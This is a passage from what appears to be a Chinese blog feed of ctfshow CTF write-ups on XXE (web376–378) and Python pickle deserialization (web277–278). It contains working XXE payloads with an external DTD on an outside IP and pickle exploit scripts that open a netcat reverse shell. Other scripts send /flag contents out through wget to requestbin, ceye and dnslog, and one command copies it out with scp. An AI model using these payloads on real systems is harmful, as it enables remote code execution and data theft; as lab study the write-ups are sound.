+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
+<p>那就直接用 web375 的方法好了</p>
+<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
+<p>我们先看一下原 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://81.71.4.233:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
+<p>那我们取其中一个试试看：</p>
+<p>先写一个编码转换的脚本（转 Unicode）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>
+
+<p>编码后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00\n\x00\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00t\x00e\x00s\x00t\x00 \x00[\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00d\x00t\x00d\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00v\x00p\x00s\x00-\x00i\x00p\x00:\x008\x000\x000\x000\x00/\x00X\x00X\x00E\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00%\x00d\x00t\x00d\x00;\x00\n\x00]\x00&gt;\x00\n\x00&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>但是直接放 Burp 里传不知道为什么成功不了</p>
+<p>试了 python 爬虫倒是成功了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://819c130f-b2e1-4626-b9f8-8326d5ececbc.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/04/02/VPGSAM5s4NgQUeb.png" alt="image-20240402200146457"></p>
+<h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>f12 发现可疑代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">        	&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码是一个 JavaScript 函数，名为<code>doLogin()</code>，它执行用户登录的操作。具体功能如下：</p>
+<ol>
+<li><p>获取用户输入的用户名和密码：</p>
+<ul>
+<li>通过<code>$(&quot;#username&quot;).val()</code>获取用户名输入框的值，存储在变量<code>username</code>中。</li>
+<li>通过<code>$(&quot;#password&quot;).val()</code>获取密码输入框的值，存储在变量<code>password</code>中。</li>
+</ul>
+</li>
+<li><p>检查用户名和密码是否为空：</p>
+<ul>
+<li>如果用户名或密码为空，则弹出警告框提示用户输入用户名和密码，并返回，不继续执行登录操作。</li>
+</ul>
+</li>
+<li><p>构建XML格式的数据：</p>
+<ul>
+<li>使用用户输入的用户名和密码构建一个XML格式的字符串，如<code>&lt;user&gt;&lt;username&gt;user123&lt;/username&gt;&lt;password&gt;pass123&lt;/password&gt;&lt;/user&gt;</code>，存储在变量<code>data</code>中。</li>
+</ul>
+</li>
+<li><p>发送Ajax请求：</p>
+<ul>
+<li>使用<code>$.ajax()</code>方法发送 POST 请求到 URL 为 “doLogin”。</li>
+<li>设置请求头的内容类型为 XML ，编码为 UTF-8 。</li>
+<li>发送构建好的 XML 数据。</li>
+<li>期望响应的数据类型为 XML 。</li>
+<li>设置<code>anysc</code>为 false ，表示同步请求。</li>
+<li>定义请求成功的回调函数和请求失败的回调函数。</li>
+</ul>
+</li>
+<li><p>处理响应：</p>
+<ul>
+<li>如果请求成功，从响应中提取<code>code</code>和<code>msg</code>，根据<code>code</code>的值显示不同的消息在页面上。</li>
+<li>如果请求失败，显示错误消息在页面上。</li>
+</ul>
+</li>
+</ol>
+<p>显然又是 XXE，输入 admin&#x2F;admin 后看他发送的包更加明了一些：</p>
+<p><img src="https://s2.loli.net/2024/04/02/iFLAJzIahG9Olf5.png" alt="image-20240402201520838"></p>
+<p>payload 反而比前面几道简单：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XEE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/04/02/OwET1C2ky7celi6.png" alt="image-20240402201914912"></p>
+]]></content>
+      <categories>
+        <category>XXE</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow python反序列化 刷题记录</title>
+    <url>/2024/03/25/ctfshow%20python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h1><p><img src="https://s2.loli.net/2024/03/22/KtLTjnsRNxovg54.png" alt="image-20240322142018874"></p>
+<p>进入靶场会看到<code>where is flag?</code>，Ctrl+U 检查源代码后可以看到注释的 html 标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>pickle.loads</code> 就知道是 python 反序列化没跑了。</p>
+<p>先看给的提示：传入的 data 先进行 base64 解码后在进行反序列化，所以我们序列化完成之后还要额外进行 base64 编码</p>
+<p>先简单的写一个爬虫脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><code>params</code> 的作用是将请求中的参数添加到 URL 中，以便将这些参数传递给服务器。在这种情况下，<code>params</code> 是一个字典，包含了要作为查询字符串添加到 URL 中的参数。最终的 URL 将包含这些参数，以便服务器可以根据这些参数来处理请求。</p>
+<p><img src="https://s2.loli.net/2024/03/25/aQXqUsPznAtljSu.png" alt="image-20240325161132826"></p>
+<p>无论是<code>ls /</code>还是<code>cat /flag</code>，回显都是 backdoor here：说明是一道 ”无回显“ 的题目。</p>
+<p>有两种方法：反弹 shell 和 的 dns 外带</p>
+<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>只需将脚本稍微改一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;nc vps-ip port -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>然后先再 vps 上开启对应端口的监听在运行脚本（否则会报错）</p>
+<p>以1234端口为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/25/LCyvSGJfg9Epw3q.png" alt="image-20240325162846097"></p>
+<p>运行脚本后则会显示：</p>
+<p><img src="https://s2.loli.net/2024/03/25/SiwdO6NEAnYuMve.png" alt="image-20240325162614566"></p>
+<p>此时就可以输入 Linux 命令来读取 flag 啦</p>
+<p><img src="https://s2.loli.net/2024/03/25/stgkjELFWx4zRCY.png" alt="image-20240325162748641"></p>
+<h2 id="dns-外带"><a href="#dns-外带" class="headerlink" title="dns 外带"></a>dns 外带</h2><h3 id="RequestBin"><a href="#RequestBin" class="headerlink" title="RequestBin"></a>RequestBin</h3><p>网址：<a href="http://requestbin.cn/">RequestBin — Collect, inspect and debug HTTP requests and webhooks</a></p>
+<p>先点击 Create a RequestBin 获取一个 url</p>
+<p>同样只需将脚本稍微改一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget http://requestbin.cn:80/1cpartx1?a=`cat /flag`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><code>wget</code>是一个在命令行下使用的下载工具，它可以从指定的URL下载文件。</p>
+<p>运行脚本就能得到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/25/YGwpP7oOaM9IK52.png" alt="image-20240325170204095"></p>
+<h3 id="CEYE"><a href="#CEYE" class="headerlink" title="CEYE"></a>CEYE</h3><p>网址：<a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p>
+<p>可以稍微参考一下这篇文章：<a href="https://blog.csdn.net/weixin_46706771/article/details/119031343">RCE绕过之无回显-CSDN博客</a>，也可以在 <a href="http://ceye.io/payloads">http://ceye.io/payloads</a> 中找相对应的 payload</p>
+<p>在 <a href="http://ceye.io/profile">http://ceye.io/profile</a> 下的 Identifier 可以获取对应 url</p>
+<p>同样只需将脚本稍微改一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.zrne70.ceye.io&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>在 <a href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 即可找到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/25/Uf6brd5ZWoIgSEa.png" alt="yqftM9pg8duAUEF"></p>
+<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>网址：<a href="http://www.dnslog.cn/">DNSLog Platform</a></p>
+<p>先点击 Get SubDomain 获取一个 url</p>
+<p>同样只需将脚本稍微改一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.n4jlw3.dnslog.cn&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本后，回到 DNSlog 平台，点击 Refresh Record 就可看到被拼接的 flag</p>
+<p><img src="https://s2.loli.net/2024/03/27/ZoxwrS8jdOpfTyE.png" alt="image-20240327153137694"></p>
+<p>我还有其他想法：既然是命令执行，为什么不尝试一下无回显 RCE 中那些获取 flag 的方式？</p>
+<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p>用如下指令将 flag 的内容上传到 vps 中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag | scp -q -P port_number -i /path/to/private_key_file - user@vps_ip:/path/on/vps/</span><br></pre></td></tr></table></figure>
+
+<p>这个命令的含义是将本地计算机上的<code>/flag</code>文件传输到远程VPS服务器上的指定路径。下面是命令中各个部分的解释：</p>
+<ul>
+<li><code>cat /flag</code>: 使用<code>cat</code>命令读取<code>/flag</code>文件的内容。</li>
+<li><code>|</code>: 管道符号，将<code>cat /flag</code>的输出作为输入传递给下一个命令。</li>
+<li><code>scp</code>: 用于在本地计算机和远程服务器之间安全地复制文件的命令。</li>
+<li><code>-q</code>: 在<code>scp</code>命令中使用<code>-q</code>参数表示安静模式，即不显示传输过程的详细信息。</li>
+<li><code>-P port_number</code>: 指定远程服务器的端口号。</li>
+<li><code>-i /path/to/private_key_file</code>: 指定用于身份验证的私钥文件的路径。</li>
+<li><code>user@vps_ip</code>: 远程VPS服务器的用户名和IP地址。</li>
+<li><code>:/path/on/vps/</code>: 在远程VPS服务器上指定的路径，将文件传输到该路径。</li>
+</ul>
+<p>更改下脚本：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag | tee 1.txt`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h1><p>提示：过滤了 os.system</p>
+<p>使用上题脚本即可</p>
+<p>python 可以执行命令的函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, <span class="built_in">map</span>, <span class="built_in">input</span>,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.<span class="built_in">open</span>, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.<span class="built_in">open</span>,</span><br><span 